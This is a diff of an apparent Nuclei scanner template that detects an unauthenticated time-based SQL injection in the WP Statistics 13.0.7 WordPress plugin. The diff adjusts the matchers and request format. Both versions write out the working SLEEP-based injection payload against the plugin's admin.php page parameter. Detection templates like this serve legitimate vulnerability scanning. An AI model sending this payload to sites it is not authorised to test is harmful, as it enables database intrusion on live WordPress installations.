@@ -1,38 +1,18 @@
-flow: http(1) && http(2)
 http:
-- matchers:
-  - internal: true
-    type: word
-    words:
-    - WP Statistics
-  raw:
-  - 'GET /wp-content/plugins/wp-statistics/readme.txt HTTP/1.1
-
-    Host: {{Hostname}}
-
-    '
 - matchers:
   - condition: and
     dsl:
-    - duration>=7
+    - duration>=6
+    - contains(content_type, "text/html") && contains(body_2, "WP Statistics")
     - status_code == 500
     type: dsl
-  raw:
-  - '@timeout: 20s
-
-    GET /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(7))a)
-    HTTP/1.1
-
-    Host: {{Hostname}}
-
-    '
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(6))a)'
+  - '{{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt'
 id: wp-statistics-sqli
 info:
   author: r3Y3r53
-  classification:
-    cpe: cpe:2.3:a:veronalabs:wp_statistics:*:*:*:*:wordpress:*:*:*
-    cwe-id:
-    - CWE-89
   description: 'WordPress Plugin WP Statistics 13.0.7  contains an unauthenticated
     Time based SQL injection vulnerability. The plugin does not sanitize and escape
     the id parameter before using it in a SQL statement, leading to an unauthenticated
@@ -43,9 +23,7 @@ info:
     '
   metadata:
     max-request: 2
-    product: wp_statistics
     publicwww-query: /wp-content/plugins/wp-statistics/
-    vendor: veronalabs
     verified: true
   name: WordPress WP Statistics Plugin 13.0.7 - SQL Injection
   reference:
@@ -54,4 +32,4 @@ info:
   - https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/
   - https://wordpress.org/plugins/wp-statistics/
   severity: high
-  tags: exploitdb,sqli,time-based-sqli,unauth,vuln,wordpress,wp,wp-plugin,wp-statistics
+  tags: sqli,unauth,exploitdb,wp-statistics,wp-plugin,wordpress,wp
